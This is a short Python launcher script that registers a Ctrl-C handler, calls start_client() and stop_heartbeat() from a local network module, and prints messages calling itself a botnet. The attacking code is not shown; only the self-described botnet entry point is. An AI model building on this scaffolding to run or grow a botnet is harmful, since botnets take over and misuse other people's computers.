from network import start_client, stop_heartbeat
import signal
import sys

def signal_handler(sig, frame):
    stop_heartbeat()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


print('Starting botnet...')

print('Starting network handlers...')
start_client()
print('Network handlers started.')

print('Botnet started')